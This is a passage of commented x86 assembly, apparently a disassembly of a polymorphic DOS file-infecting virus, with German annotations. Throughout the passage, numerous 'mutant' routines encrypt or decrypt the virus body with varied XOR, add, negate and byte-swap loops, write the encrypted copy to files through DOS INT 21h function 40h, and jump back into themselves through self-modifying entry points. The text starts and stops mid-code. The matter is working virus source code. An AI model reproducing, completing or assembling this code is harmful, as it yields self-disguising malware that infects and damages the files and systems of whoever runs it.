                MOV     BX,CS
                PUSH    BX
                MOV     BX,DS                   ; BX <- DS, BX = 4BCF !
                POP     DS                      ; DS=CS
                ADD     BX,0DC61h               ; BX = 2830
                CALL    J03B61                  ; CX = 11C3
                MOV     DX,0002h                ; DX = 2
J03B46:         XOR     WORD Ptr DS:[BX],0406h
                ADD     BX,DX
                LOOP    J03B46
                                                ; BX = 4BB6
                ADD     BX,008Dh                ; BX = 4C43 / 2443
                PUSH    [BX]                    ; [BX]=[2443]  ????????
                POP     CX                      ; CX = ?
                DEC     CL                      ; CX = ?
                JZ      J03B60                  ;
                PUSH    ES
                POP     DS
                CALL_ENTRY 20,mut_20

J03B5E:         POP     DS
                PUSH    DS
J03B60:         RETN

J03B61:         MOV     CX,1100h
                OR      CL,0C3h                 ; CX = 11C3
                RETN
;=====================================================================
;===================================================( MUTANT # 21 )===
;=====================================================================
MUT_21          EQU     $
                CALL    J03BAE                  ; CX = 11C3
J03B6B:         XOR     WORD Ptr DS:[BX],239Ah
                ADD     BX,+01h
                CLC
                INC     BX
                LOOP    J03B6B

                POP     BX
                CLD
                POP     CX
                CALL_INT21 21,MUT_21
                PUSH    DX
                INC     DX
                POP     DX
        ;--------( einsprung ) ------
                CALL    J03BAB                  ; DS <- 4BCF
                MOV     BX,CS
                PUSH    BX
                MOV     BX,DS                   ; BX = 4BCF
                POP     DS                      ; DS = CS
                ADD     BX,0DC61h               ; BX = 2830
                CALL    J03BAE                  ; CX = 11C3
                MOV     AX,0002h                ; AX = 0002

J03B92:         XOR     WORD Ptr DS:[BX],239Ah
                NOP
                ADD     BX,AX
                LOOP    J03B92

                ADD     BX,008Dh                ; BX = 4BB6
                PUSH    [BX]
                POP     BX
                DEC     BL                      ; CMP byte Ptr DS:[4C43],1
                JZ      J03BAD
                PUSH    ES
                POP     DS
                CALL_ENTRY 21,mut_21
                ;-------------------
J03BAB:         POP     DS
                PUSH    DS
J03BAD:         RETN

J03BAE:         MOV     CX,0C311h               ; MOV CX,11C3
                XCHG    CH,CL                   ; RET
                RETN
;=====================================================================
;===================================================( MUTANT # 22 )===
;=====================================================================
MUT_22          EQU     $
                CALL    J03BF9                  ; CX = 11C3
J03BB7:         XOR     WORD Ptr DS:[BX],0138h
                ADD     BX,+02h
                LOOP    J03BB7
                POP     BX
                CLC
                POP     CX
                CALL_INT21 22,MUT_22
                JMP     SHORT J03BCB

                DB      23h,87h,0ch
        ;--------( einsprung ) ------
J03BCB:         CALL    J03BF6                  ; DS <-

                MOV     BX,CS
                PUSH    DS                      ; DS = CS
                MOV     DS,BX
                POP     BX                      ; BX =
                SUB     BX,239Fh                ; BX =
                CALL    J03BF9                  ; CX = 11C3
                MOV     AX,0002h                ; AX = 0002

J03BDE:         XOR     WORD Ptr DS:[BX],0138h
                ADD     BX,AX
                LOOP    J03BDE
                ADD     BX,008Dh                ; BX =
                PUSH    [BX]
                POP     BX
                DEC     BL                      ;
                JZ      J03BF8
                PUSH    ES
                POP     DS
                JMP_ENTRY 22,mut_22

J03BF6:         POP     DS
                PUSH    DS
J03BF8:         RETN

J03BF9:         MOV     CX,0C311h                 ; MOV CX,11C3
                XCHG    CL,CH                    ; RET
                RETN

                DB      0CCh
;=====================================================================
;===================================================( MUTANT # 23 )===
;=====================================================================
MUT_23          EQU     $
                XCHG    CL,CH                   ; = OFFSET 4BB5
                XOR     CX,94E0h                ; CX=2385 -> 8523 -> 11c3
J03C06:         INC     BX
                ADD     WORD Ptr DS:[BX],00FEh
                INC     BX
                LOOP    J03C06
                MOV     AX,DX
                POP     DX
                MOV     BX,DX
                POP     CX
                PUSH    AX
                JMP     SHORT J03C42

        ;--------( einsprung ) ------
J03C17:         CALL    J03C1B
J03C1A:         RETN

J03C1B:         MOV     BX,0DC61h               ; BX =
                POP     CX                      ; CX =
                ADD     BX,CX                   ; BX =
                PUSH    CS
                MOV     CX,11C4h                ; CX =
                POP     DS                      ; DS =
                DEC     CL                      ; CX = 11C3
J03C28:         INC     BX
                SUB     WORD Ptr DS:[BX],00FEh
                INC     BX
                LOOP    J03C28
                PUSH    SI                      ; BX =
                MOV     SI,BX                   ; SI =
                ADD     SI,008Dh                ; SI =
                DEC     BYTE Ptr DS:[SI]        ;
                POP     SI
                JZ      J03C1A
                PUSH    ES
                CLC
                POP     DS
                JMP_ENTRY 23,mut_23

J03C42:         POP     DX
                MOV     AL,40h
                XCHG    AH,AL                   ; AH = 40h !!!!!!!
J03C47:
                CALL_INT21 23,MUT_23
                JMP     J03C17
END_23:
;=====================================================================
;===================================================( MUTANT # 27 )===
;=====================================================================
MUT_27          EQU     $
                SUB     CH,12h                  ; = OFFSET 4BB5
                ADD     CL,3Eh                  ; cx=2385 -> 11c3
J03C52:         ADD     [BX],CX
                ADD     BX,+04h
                SUB     BX,+02h
                LOOP    J03C52
                XCHG    BP,BX
                POP     BP
                XCHG    BX,BP
                JMP     SHORT J03C8D

        ;--------( einsprung ) ------
J03C63:         CALL    J03C67
J03C66:         RETN

J03C67:         POP     CX
                MOV     BX,0DC61h
                ADD     BX,CX
                PUSH    CS
                MOV     CX,10C3h
                POP     DS
                INC     CH
J03C74:         SUB     [BX],CX
                INC     BX
                STC
                INC     BX
                LOOP    J03C74
                MOV     BP,BX
                ADD     BP,008Dh
                DEC     BYTE PTR [BP+00h]
                POP     BP
                JZ      J03C66
                PUSH    ES
                POP     DS
                JMP_ENTRY 27,mut_27

J03C8D:         POP     CX
                PUSH    BP
                MOV     BP,2567h
                INC     BP

J03C93:

                CALL    DS:BP
                JMP     J03C63
;=====================================================================
;===================================================( MUTANT # 24 )===
;=====================================================================
Mut_24          EQU     $
                ADD     CX,0EE3Eh               ; = OFFSET 4BB5
                JMP     SHORT J03CA7
                db      43h
J03C9F:         NEG     WORD Ptr DS:[BX]
                ADD     BX,+02h
                LOOP    J03C9F
J03CA6:         RETN

J03CA7:         CALL    J03C9F
                CALL    J03CCE

                DB      0EAH
                DB      12H

        ;--------( einsprung ) ------
J03CAF:         PUSH    AX
                CALL    J03CDD
                ADD     DX,0DC60h
                MOV     CH,11h
                MOV     CL,0C3h
                XCHG    BX,CX
                CALL    J03C9F
                TEST    BYTE Ptr DS:[D2433],0FEh
                JZ      J03CA6
                MOV     CX,ES
                MOV     DS,CX
                CALL_ENTRY 24,mut_24
                ;-------------------
J03CCE:         POP     CX
                POP     AX
                XCHG    AX,BX
                POP     AX
                XCHG    AX,CX
                MOV     AH,3Fh
                INC     AH
                CALL_INT21 24,mut_24
                POP     AX
                JMP     J03CAF

J03CDD:         MOV     BX,CS
J03CDF:         MOV     DS,BX
                POP     DX
                PUSH    DX
                RETN
;=====================================================================
;====================================================( MUTANT # 28)===
;=====================================================================
mut_28          EQU     $
                XOR     CX,3246h                ; = OFFSET 4BB5
                JMP     SHORT J03CF3

J03CEA:         XOR     [BX],CX
                ADD     BX,+03h
                DEC     BX
                LOOP    J03CEA
J03CF2:         RETN

J03CF3:         CALL    J03CEA
                CALL    J03D18
J03CF9:         XCHG    BL,BH
        ;--------( einsprung ) ------
                CALL    J03D29
                XCHG    DX,BX
                ADD     BX,0DC61h
                MOV     CX,ZweiByte
                CALL    J03CEA
                TEST    BYTE Ptr DS:[D2433],0FEh
                JZ      J03CF2
                MOV     DX,ES
                MOV     DS,DX
                JMP_ENTRY 28,mut_28

J03D18:         POP     AX
                POP     AX
                MOV     BX,AX
                POP     AX
                MOV     CX,AX
                XOR     AH,AH
                OR      AH,40h          ; AH = 40h
                CALL_INT21 28,mut_28
                JMP     J03CF9

J03D29:         MOV     BX,CS
J03D2B:         MOV     DS,BX
                POP     DX
                PUSH    DX
                RETN
;=====================================================================
;====================================================( MUTANT # 26)===
;=====================================================================
mut_26          EQU     $
                SUB     BX,+02h                 ; = OFFSET 4BB5
                ADD     CX,0EE3Ch
                MOV     AX,[BX]
J03D39:         INC     BX
                INC     BX
                SUB     [BX],AX
                LOOP    J03D39
                POP     BX
                XLAT                            ; MOV AL,[BX+AL]
                POP     CX
                JMP     SHORT J03D6C

J03D44:         POP     BX
                PUSH    BX
J03D46:         RETN

        ;--------( einsprung ) ------
J03D47:         PUSH    CS
                POP     DS
                CALL    J03D44
                ADD     BX,0DC5Dh
                MOV     CX,11C1h
                MOV     AX,[BX]
J03D55:         INC     BX
                INC     BX
                ADD     [BX],AX
                LOOP    J03D55
                ADD     BX,0092h
                CMP     BYTE Ptr DS:[BX+01h],01h
                JZ      J03D46
                PUSH    ES
                AND     AX,CX
                POP     DS
                CALL_ENTRY 26,mut_26
                ;-------------------
J03D6C:         MOV     AH,30h
                ADD     AH,10h

                PUSH    SI
                MOV     SI,1466h
                CALL    [SI+1100h]      ; CALL INT 21h
                POP     SI
                JMP     J03D47

;=====================================================================
;=====================================================( MUTANT #1 )===
;=====================================================================
MUT_1           EQU     $
                SUB     CX,11C4h                ; = OFFSET 4BB5
                SUB     BX,+02h
                MOV     AX,[BX]
J03D85:         INC     BX
                INC     BX
                SUB     [BX],AX
                LOOP    J03D85
                POP     BX
                POP     CX
                JMP     SHORT J03DB9

J03D8F:         POP     BX
                CLD
                PUSH    BX
J03D92:         RETN
        ;--------( einsprung ) ------
J03D93:         PUSH    CS
                POP     DS
                CALL    J03D8F                  ; BX =
J03D98:         SUB     BX,23A3h                ; BX =
                MOV     CX,11C1h                ; CX =
                MOV     DX,[BX]
J03DA1:         INC     BX
                INC     BX
                ADD     [BX],DX
                LOOP    J03DA1
                PUSH    BP
                MOV     BP,0433h
                CMP     BYTE PTR [BP+2000h],01h ; [2433]
                POP     BP
                JZ      J03D92                  ; AUSGANG !
                PUSH    ES
                POP     DS
                CALL_ENTRY 1,mut_1
                ;-----------------
J03DB9:         MOV     AH,20h
                ADD     AH,AH                   ; AH = 40h => Schreiben !!!!!!

                MOV     BP,2466h
                CALL    CS:[BP+0100h]           ; CALL Int 21h !
                JMP     J03D93
                DB      89H

;=====================================================================
;====================================================( MUTANT #17 )===
;=====================================================================
MUT_17          EQU     $
                xor     ax,ax                   ; = OFFSET 4BB5
                ADD     CX,BX
J03DCC:         MOV     AL,[BX]
                SUB     [BX-01],AL
                SUB     BX,+02h
                CMP     BX,+1Fh
                JNZ     J03DCC
                POP     BX
                CLD
                POP     CX
                CALL    J03E04                  ; = JMP 3E04
        ;--------( einsprung ) ------
J03DDF:         PUSH    CS
                STD
                POP     DS
                POP     AX                      ; AX =
                CALL    J03E11                  ; AX =
                XCHG    AX,BX                   ; BX =
                MOV     CX,ZweiByte             ; CX =
                SUB     BX,+1Eh                 ; BX =

J03DED:         MOV     DL,[BX]
                ADD     [BX-01h],DL
                DEC     BX                      ; (!!!!!)
                CMC
                DEC     BX
                LOOP    J03DED
                                        ; BX =
                CMP     BYTE Ptr DS:[D2433],01h
                JZ      J03E13
                PUSH    ES
                CMC
                POP     DS
                CALL_ENTRY 17,mut_17

J03E04:         POP     AX
                XOR     AH,AH
                OR      AH,40h                  ; AH = 40h, SCHREIBEN

                CALL    DS:[@INT21]   ; CALL INT 21h
                CALL    J03DDF
J03E11:         POP     AX
                PUSH    AX
J03E13:         RETN
;=====================================================================
;====================================================( MUTANT # 16)===
;=====================================================================
MUT_16          EQU     $
                ADD     BX,CX                   ; = OFFSET 4BB5
                MOV     CX,0001h
                INC     CX                      ; CX = 2
J03E1A:         MOV     AL,[BX]
                ADD     [BX-01h],AL
                SUB     BX,CX
                CMP     BX,+1Fh
                JNZ     J03E1A
                POP     BX
                POP     CX
                CALL    J03E4F
        ;--------( einsprung ) ------
J03E2B:         POP     BX                      ; BX =
                PUSH    CS
                POP     DS
                CALL    J03E5C                  ; AX =

                XCHG    AX,BX                   ; AX =
                SUB     BX,+1Dh                 ; BX =
                MOV     CX,ZweiByte             ; CX =

J03E38:         MOV     AL,[BX]
                SUB     [BX-01h],AL
                DEC     BX
                DEC     BX
                LOOP    J03E38
                                        ; BX =
                CMP     BYTE Ptr DS:[D2433],01h
                JZ      J03E5E
                PUSH    ES
                SUB     AX,AX
                POP     DS
                CALL_ENTRY 16,mut_16
;----------------------------------------------------------------------
J03E4F:         POP     AX
                MOV     AH,40h                  ; AH = 40h

                PUSH    SI
                MOV     SI,Offset @INT21+2       ; Schreiben ? Int 21h ?
J03E56:         CALL    SI
                POP     SI
                CALL    J03E2B
J03E5C:         POP     AX
                PUSH    AX
J03E5E:         RETN
                DB      0ebh
;=====================================================================
;===================================================( MUTANT # 18 )===
;=====================================================================
mut_18          EQU     $
J03E60:         NOT     BYTE Ptr DS:[BX]        ; = OFFSET 4BB5
                NEG     BYTE Ptr DS:[BX]
                ADD     BX,+01h
                LOOP    J03E60
                POP     BX
                CLD
                POP     CX
                CALL_INT21 18,mut_18
                JMP     SHORT J03E78

J03E71:         MOV     DX,CS
                MOV     DS,DX
                CALL    J03E7B
        ;--------( einsprung  ist $-1 )-------
        ; ADD BH,DL
        ; JMP J03E71
        ;-------------------------------------

J03E78:         XLAT                            ; MOV AL,[BX+AL]
                JMP     J03E71

J03E7B:         POP     DX                      ; DX =
                SUB     DX,239Dh                ; DX =
                STC
                XCHG    BX,DX                   ; BX =
                MOV     CX,CODE_LEN XOR 0F0FH   ; CX =
                CLC
                XOR     CX,0F0Fh                ; CX =
J03E8B:         NEG     BYTE Ptr DS:[BX]
                NOT     BYTE Ptr DS:[BX]
                INC     BX
                STD
                LOOP    J03E8B
                                        ; BX =
                MOV     CH,8Dh          ; CX =
                MOV     AL,01h
                ADD     AL,CH           ;
                XLAT                    ; MOV AL,[BX+AL] ; AL = []
                CLC
                CMP     AL,01h
                JZ      J03E56  ;-<<>>--< ZEIGT AUF L0L0L0 >-----<<>>--

                MOV     CX,ES
                MOV     AX,SS

                SUB     AX,AX                   ; AX <- 0
                PUSH    DS
                MOV     DS,CX                   ; DS <- ES
                POP     CX                      ; CX <- DS
                JMP_ENTRY 18,mut_18
;=====================================================================
;====================================================( MUTANT #30 )===
;=====================================================================
Mut_30          EQU     $
J03EAC:         NEG     BYTE Ptr DS:[BX]        ; = OFFSET 4BB5
                NOT     BYTE Ptr DS:[BX]
                INC     BX
                LOOP    J03EAC
                POP     CX
                POP     BX
                XCHG    CX,BX
                CALL_INT21 30,mut_30
                JMP     SHORT J03EC3

J03EBC:         MOV     AX,CS
                MOV     DS,AX
                CALL    J03EC5                  ;
        ;-------( einsprung )--------------
J03EC3:         JMP     J03EBC

J03EC5:         POP     AX                      ; AX =
                SUB     AX,239Ch                ; AX =
                XCHG    AX,BX                   ; BX =

                MOV     CX,CODE_LEN XOR 0FDABH  ;
                XOR     CX,0FDABh               ; CX = 2385

J03ED1:         NOT     BYTE Ptr DS:[BX]
                NEG     BYTE Ptr DS:[BX]
                INC     BX
                LOOP    J03ED1
                                        ; BX =
                MOV     AL,8Eh
                XLAT                            ; MOV AL,[BX+AL]; AL = []
                CMP     AL,01h
                JZ      J03EF2
                MOV     AX,ES
                MOV     BX,AX                   ; BX <- ES
                PUSH    DS
                MOV     DS,BX                   ; DS <- ES
                POP     BX                      ; BX <- DS
                SUB     AX,AX                   ; AX <- 0
                JMP_ENTRY 30,mut_30

;--------------------------------------------------------
                Dw      8903h,0A5EFh,0CC14H
J03EF2:         RET
                dw      0c111h,0b4deh
;=====================================================================
;=====================================================( MUTANT # 8)===
;=====================================================================
mut_8           EQU     $
                PUSH    BP                      ; = OFFSET 4BB5
                INC     BX
                DEC     CX
                CALL    J03F06
J03EFE:         DEC     CX
                NEG     BYTE Ptr DS:[BX]
                ADD     BX,+02h
                DEC     CX
J03F05:         RETN

J03F06:         POP     BP                      ; BP =
J03F07:         CALL    J03EFE
                JZ      J03F3C
                JMP     J03F07

J03F0E:         PUSH    BP
        ;-------( einsprung )--------------
                PUSH    CS
J03F10:         CLC
                POP     DS                      ; DS = CS
                CALL    J03F38                  ; BP = OFFSET $+3
J03F15:         MOV     CL,84h                  ; CX = xx84
                SUB     BP,23A1h                ; BP = 2831
                MOV     BX,BP                   ; BX = 2831
                MOV     CH,23h                  ; CX = 2384
J03F1F:         CALL    J03EFE
                JNZ     J03F1F                  ; = LOOP 3F1F

                MOV     AX,BP                   ; AX=BP=2831
                MOV     BP,BX                   ; BX=4C00
                ADD     BP,008Eh                ; BP=
                DEC     BYTE PTR [BP+00h]       ;
                POP     BP                      ; BP=egal
                JZ      J03F05                  ; = RET
                PUSH    ES
                POP     DS
                PUSH    AX                      ; AX=2831
                MOV     AX,CX                   ; AX = 0
J03F38:         POP     BP                      ; BP=2831
                PUSH    CS
                PUSH    BP
                RETF                            ; JMP FAR CS:2830

J03F3C:         POP     BP
                POP     BX
                POP     CX
                CALL_INT21 8,mut_8
                JMP     J03F0E
;=====================================================================
;=====================================================( MUTANT #7 )===
;=====================================================================
Mut_7           EQU     $
                INC     BX                      ; = OFFSET 4BB5
                PUSH    DX
                DEC     CX
J03F47:         CALL    J03F52
J03F4A:         NOT     BYTE Ptr DS:[BX]
                DEC     CX
                ADD     BX,+02h
                DEC     CX
                RETN

J03F52:         POP     DX
J03F53:         CALL    J03F4A
                JZ      J03F86
                JMP     J03F53

J03F5A:         PUSH    DX
        ;-------( einsprung )--------------
                PUSH    CS
J03F5C:         POP     DS
                CALL    J03F83                  ; DX =
J03F60:         SUB     DX,23A0h                ; DX =
                MOV     BX,DX                   ; BX =
                MOV     CX,8423h
                XCHG    CL,CH                   ; CX = 2384
J03F6B:         CALL    J03F4A
                JNZ     J03F6B                  ; LOOP
                XCHG    AX,DX                   ; AX =
                MOV     DX,BX                   ; BX = , DX = BX
                ADD     DX,008Eh                ; DX =
                XCHG    DX,BX                   ; BX = , DX =
                DEC     BYTE Ptr DS:[BX]
                POP     DX                      ; DX = ????
                JZ      J03F85
                PUSH    ES
                POP     DS                      ; DS = ES
                PUSH    AX
                XOR     AX,AX                   ; AX = 0
J03F83:         POP     DX                      ; DX =
                PUSH    DX
J03F85:         RETN                            ; JMP 2831
;---------------------------------------------------------------
J03F86:         POP     DX                      ;
                POP     BX
                POP     CX
J03F89:
                CALL_INT21 7,mut_7
                XLAT                            ; MOV AL,[BX+AL]
                CLC
J03F8E:         JMP     J03F5A
;=====================================================================
;===================================================( MUTANT # 12 )===
;=====================================================================
mut_12          EQU     $
                JMP     SHORT J03FA0            ; = OFFSET 4BB5

J03F92:         POP     BX
                MOV     AH,40h
                POP     CX
                CALL_INT21 12,mut_12
;==========================================================
J03F99:         JMP     SHORT J03FA7

J03F9B:         POP     BX
                PUSH    CS
                POP     DS
                PUSH    BX
                RETN

J03FA0:         CALL    J03FCC
                JNZ     J03FA0
                JMP     J03F92

        ;-------( einsprung )--------------
J03FA7:         CALL    J03F9B
J03FAA:         MOV     CX,239Fh                ; BX = ; DS = CS
                SUB     BX,CX                   ; CX =
                SUB     CX,+1Ah                 ; CX =
J03FB2:         CALL    J03FCC
                JNZ     J03FB2
                XOR     BYTE Ptr DS:[BX+008Eh],01h
                JZ      J03FCB
                CALL    J03F9B
J03FC1:         SUB     BX,23B4h                ; BX = , BX <-
                DEC     BX                      ; BX =
                MOV     AX,CX
                PUSH    BX                      ;
                PUSH    ES
                POP     DS
J03FCB:         RETN                            ; = JMP 2831

J03FCC:         PUSH    [BX]
                POP     AX
                XOR     [BX+02h],AL
                XOR     [BX+01h],AL
                ADD     BX,+03h
                SUB     CX,+03h
                RETN
;=====================================================================
;===================================================( MUTANT # 11 )===
;=====================================================================
Mut_11          EQU     $
                JMP     SHORT J03FEC            ; = OFFSET 4BB5

J03FDE:         POP     BX
                POP     CX
                MOV     AH,40h
                CALL_int21 11,mut_11
                JMP     SHORT J03FF3

J03FE7:         POP     BX
                PUSH    BX
                PUSH    CS
                POP     DS
J03FEB:         RETN

J03FEC:         CALL    J04019
                JNZ     J03FEC
                JMP     J03FDE

        ;-------( einsprung )--------------
J03FF3:         CALL    J03FE7
J03FF6:         MOV     AX,239Fh        ; BX =
                SUB     BX,AX           ; BX =
                MOV     CX,001Ah        ; CX =
                XOR     CX,AX           ; CX = 2385
J04000:         CALL    J04019
                JNZ     J04000
                XOR     BYTE Ptr DS:[BX+008Eh],01h
                JZ      J03FEB
                CALL    J03FE7
J0400F:         SUB     BX,23B7h        ; BX <-
                PUSH    BX              ; RET
                PUSH    ES
                MOV     AX,CX
                POP     DS
                RETN

J04019:         MOV     AH,[BX]
                XOR     [BX+01h],AH
                XOR     [BX+02h],AH
                ADD     BX,+03h
                SUB     CX,+03h
                RETN
;=====================================================================
;====================================================( MUTANT # 14)===
;=====================================================================
Mut_14          EQU     $
                JMP     SHORT J04042            ; = OFFSET 4BB5

J0402A:         POP     AX
                MOV     BX,AX
                POP     AX
                PUSH    SI
                MOV     CX,AX
                PUSH    word ptr DS:[@INT21]
                MOV     AX,4000h        ; Schreiben !

                POP     SI
                CALL    SI              ; CALL INT 21h
                POP     SI
                STC
                NOP
                CLC
        ;-------( einsprung )--------------
                JMP     J04049

J04042:         INC     BYTE Ptr DS:[BX]
                INC     BX
                LOOP    J04042
                JMP     J0402A

J04049:         CALL    J0406E
                MOV     CX,Code_Len
                SUB     BX,23A9h
J04053:         DEC     BYTE Ptr DS:[BX]
                INC     BX
                LOOP    J04053

                PUSH    BP
                MOV     BP,BX
                ADD     BP,008Eh
                XOR     AX,AX
                CMP     BYTE PTR [BP+00h],01h
                POP     BP
                JZ      J04072
                PUSH    ES
                POP     DS
                JMP_entry 14,mut_14

J0406E:         PUSH    CS
J0406F:         POP     DS
                POP     BX
                PUSH    BX
J04072:         RETN

                DB      0CDh
;=====================================================================
;====================================================( MUTANT # 10)===
;=====================================================================
mut_10          EQU     $
                PUSH    AX
                DEC     CL
                JMP     SHORT J0408F

J04079:         MOV     AL,[BX]
                INC     BX
                MOV     AH,[BX]
                XCHG    AL,AH
                MOV     [BX-01h],AL
                DEC     CX
                MOV     [BX],AH
                INC     BX
                XOR     AX,AX
                DEC     CX
J0408A:         RETN

        ;-------( einsprung )--------------
J0408B:         PUSH    CS
                POP     DS
                JMP     SHORT J040A2

J0408F:         CALL    J04079
                CLC
                JNZ     J0408F
                POP     AX
                POP     BX
                POP     CX

                PUSH    BP
                PUSH    word ptr DS:[@INT21]
                POP     BP
                CALL    DS:BP           ; CALL Int 21H
                POP     BP
J040A2:         CALL    J040A5
J040A5:         MOV     CX,2384h        ; CX = 2384
                POP     BX              ; BX = 40A5
                SUB     BX,23B6h        ; BX = 1cef
J040AD:         CALL    J04079
                JNZ     J040AD
                CMP     BYTE Ptr DS:[BX+008Fh],01h
                CLD
                JZ      J0408A
                PUSH    ES
J040BB:         POP     DS
                JMP_ENTRY 10,mut_10
                DB      089h
;=====================================================================
;====================================================( MUTANT # 29)===
;=====================================================================
Mut_29          EQU     $
                DEC     CX                      ; = OFFSET 4BB5
                PUSH    AX
                JMP     SHORT J040DB

J040C4:         MOV     AL,[BX]
                INC     BX
                MOV     AH,[BX]
                XCHG    AH,AL
                MOV     [BX-01h],AL
                MOV     [BX],AH
                INC     BX
                XOR     AX,AX
                SUB     CX,+02h
J040D6:         RETN

        ;-------( einsprung )--------------
J040D7:         PUSH    CS
                POP     DS
                JMP     SHORT J040F0

J040DB:         CALL    J040C4
                JNZ     J040DB
                POP     AX
                POP     BX
                STI

                POP     CX
                PUSH    word ptr DS:[@INT21]
                POP     word ptr DS:[D259A]
                CALL    WORD PTR DS:[D259A]     ; CALL INT 21H
J040F0:         CALL    J040F3
J040F3:         POP     BX                      ; BX =
                SUB     BX,23B8h                ; BX =
                MOV     CX,2384h                ; CX = 2384
J040FB:         CALL    J040C4
                JNZ     J040FB
                CMP     BYTE Ptr DS:[BX+008Fh],01h
                JZ      J040D6
J04107:         PUSH    ES
                POP     DS
                JMP_ENTRY 29,mut_29
;=====================================================================
;====================================================( MUTANT # 15)===
;=====================================================================
mut_15          EQU     $
                PUSH    DX                      ; = OFFSET 4BB5
                MOV     DH,[BX-01h]
                PUSH    AX
J04111:         MOV     DL,[BX]
                DEC     DH
                XOR     [BX],DH
                XCHG    DH,DL
                ADD     BX,+01h
                LOOP    J04111
                POP     CX
                POP     AX
                JMP     J04128

        ;-------( einsprung )--------------
J04123:         CALL    J04126
J04126:         JMP     SHORT J04135

J04128:         MOV     DX,AX
                POP     AX
                MOV     BX,AX
                POP     AX
                XCHG    AX,CX

                CALL    DS:[@INT21]         ; CALL INT 21
                JMP     J04123

J04135:         POP     BX              ; BX =
                MOV     CX,Code_Len        ; CX = 2385
                PUSH    CS
                SUB     BX,239Fh        ; BX =
                POP     DS

J0413F:         MOV     AL,[BX-01h]
                DEC     AL
                XOR     [BX],AL
                INC     BX
                LOOP    J0413F
                CMP     BYTE Ptr DS:[BX+008Eh],01h ;
                JNZ     J04151
                RETN

J04151:         PUSH    ES
                XOR     AX,AX
                POP     DS
                JMP_ENTRY 15,mut_15
;=====================================================================
;=====================================================( MUTANT #6 )===
;=====================================================================
mut_6           EQU     $
                DEC     CL                      ; = OFFSET 4BB5
J0415A:         XOR     BYTE Ptr DS:[BX],67h
                INC     BX
                DEC     CX
                INC     BX
                DEC     CX
                JNZ     J0415A

                PUSH    word ptr DS:[@INT21]
                POP     word ptr DS:[D2598+1]
                POP     BX
                POP     CX
                JMP     SHORT J04172

        ;-------( einsprung )--------------
J0416F:         CALL    J041A1
J04172:         CALL    WORD PTR DS:[D2598+1] ; == call Int 21
                JMP     J0416F

J04178:         MOV     AX,0002h        ; AX = 0002
                ADD     BX,0DD61h       ; BX =
                DEC     BH              ; BX =
                MOV     CX,2184h        ; CX = 2184
                PUSH    CS
                XOR     CH,AL           ; CX = 2386
                POP     DS

J04188:         XOR     BYTE Ptr DS:[BX],67h
                DEC     CX
                ADD     BX,AX           ; Jedes 2 byte verXORen
                DEC     CX
                JNZ     J04188          ; 11C3 (!!!) mal :)

                ADD     BX,008Fh        ; BX =
                DEC     BYTE Ptr DS:[BX];
                PUSH    ES
                POP     DS
                JNZ     J0419C           ; <- BX+8E
                RETN

J0419C:         MOV     AX,CX
                JMP_ENTRY 6,mut_6

J041A1:         POP     BX
                JMP     J04178
;=====================================================================
;====================================================( MUTANT # 25)===
;=====================================================================
mut_25          EQU     $
                DEC     CX                      ; = OFFSET 4BB5
J041A5:         XOR     BYTE Ptr DS:[BX],0E8h
                ADD     BX,+02h
                SUB     CX,+02h
                JNZ     J041A5
                POP     BX
                PUSH    word ptr DS:[@INT21]
                POP     word ptr DS:[D2598]
                JMP     SHORT J041BE

        ;-------( einsprung )--------------
J041BB:         CALL    J041EC
J041BE:         POP     CX

                CALL    [D2598]
                JMP     J041BB

J041C5:         MOV     AX,0002h       ; AX = 2,BX =
                ADD     BX,0DC61h      ; BX =
                MOV     CX,2386h       ; CX = 2386
                PUSH    CS
                XOR     CX,AX          ; CX = 2384
                POP     DS
J041D3:         XOR     BYTE Ptr DS:[BX],0E8h
                ADD     BX,AX
                SUB     CX,AX
                JNZ     J041D3
                               ; BX =
                ADD     BX,008Fh       ; BX =
                DEC     BYTE Ptr DS:[BX]
                PUSH    ES
                POP     DS
                JNZ     J041E7
                RETN

J041E7:         MOV     AX,CX
                JMP_entry 25,mut_25

J041EC:         POP     BX
                JMP     J041C5

                db      33h
;=====================================================================
;=====================================================( MUTANT #4 )===
;=====================================================================
mut_4           EQU     $
                PUSH    DX                      ; = OFFSET 4BB5
                MOV     DH,[BX-01]
J041F4:         MOV     DL,[BX]
                XOR     [BX],DH
                XCHG    DH,DL
                ADD     BX,+01h
                LOOP    J041F4
                POP     DX
                STI
                POP     BX
                POP     CX

                CALL    DS:[@INT21]         ; CALL Int 21
        ;----( einsprung )----
                CALL    J0420D
J0420A:         INC     AX
                XOR     BX,SI
J0420D:         OR      SI,SI
                INC     BH
                POP     BX              ; BX =
                SUB     BX,23A1h        ; BX =
                ADD     BX,+02h         ; BX =
                MOV     CX,2485h
                DEC     CH              ; CX = 2385
                PUSH    CS
                POP     DS
J04220:         MOV     AL,[BX-01h]
                XOR     [BX],AL
                INC     BX
                LOOP    J04220
                                ; BX =
                ADD     BX,008Eh        ; BX =
                XCHG    BX,SI
                DEC     BYTE Ptr DS:[SI]
                JNZ     J04235
                XCHG    SI,BX
                RETN

J04235:         PUSH    ES
                XOR     AX,AX
                POP     DS
                JMP_ENTRY 4,mut_4
;=====================================================================
;====================================================( MUTANT #13 )===
;=====================================================================
mut_13          EQU     $
                PUSH    DX                      ; = OFFSET 4BB5
                MOV     DH,[BX-01h]
J04240:         MOV     DL,[BX]
                ADD     [BX],DH
                XCHG    DL,DH
                INC     BX
                LOOP    J04240

                POP     DX
                POP     BX
                POP     CX
                PUSH    SI
                MOV     SI,2567h

                DEC     SI
                CALL    [SI]
        ;--------( einsprung ) ------
                CALL    J04258
                XOR     BX,SI
J04258:         XOR     SI,1876h
                POP     BX
                POP     SI
                SUB     BX,Code_start   ; BX = 2830
                MOV     CX,Code_Len     ; CX = 2385 wal-size
                PUSH    CS
                POP     DS
J04267:         MOV     AL,[BX-01h]
                SUB     [BX],AL
                INC     BX
                LOOP    J04267
                ADD     BX,008Eh
                XCHG    SI,BX
                DEC     BYTE Ptr DS:[SI]
                JNZ     J0427C
                XCHG    BX,SI
                RETN

J0427E          equ     $+3     ; SPRUNGZIEL FöR M#19, zeigt auf L0L0L0
J0427C:         PUSH    ES
                XOR     AX,AX
                POP     DS
                JMP_ENTRY 13,mut_13

                DW      0CE8BH
                DW      05605H
                DB      34H
;=====================================================================
;====================================================( MUTANT # 19)===
;=====================================================================
mut_19          EQU     $
                PUSH    AX                      ; = OFFSET 4BB5
J04289:         XOR     BYTE Ptr DS:[BX],05h
                INC     BYTE Ptr DS:[BX]
                INC     BX
                LOOP    J04289
                POP     AX
                INC     BX
                INC     CX
                STD
                STC
                PUSH    AX
                XLAT                            ; MOV AL,[BX+AL]
                POP     AX
                POP     BX
                POP     CX

